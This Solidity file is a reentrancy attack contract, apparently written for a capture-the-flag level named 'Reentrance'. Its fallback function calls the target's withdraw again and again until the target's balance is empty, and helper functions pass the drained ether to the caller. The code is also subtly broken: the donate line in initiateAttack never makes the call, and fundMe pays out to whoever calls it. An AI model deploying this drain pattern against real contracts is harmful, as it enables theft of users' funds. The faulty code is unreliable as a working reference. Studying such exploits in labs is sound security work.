// SPDX-License-Identifier: MIT
// instance 0x7dFBaDAbf81EF2a688a0771b40e1C7F8c3c6154e
pragma solidity ^0.8.0;

import"./Reentrancy.sol";

contract ReentrancyAttack {

    Reentrance original;

    uint amount = 1 ether;

    constructor (address payable _originaladdress) public payable{
        original = Reentrance(_originaladdress);
    }

    function initiateAttack() public {
        original.donate{value: amount, gas: 4000000};
    }

    fallback() external payable{
        if (address(original).balance != 0) {
            original.withdraw(1 ether);
        }

    }

    function fundMe(uint _amount) public payable {
        (bool sent, bytes memory data) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    function sendMoneyBack() public payable {
        (bool sent, bytes memory data) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");

    }

    function seeBalance() public view returns(uint) {
        return address(this).balance;
    }
}
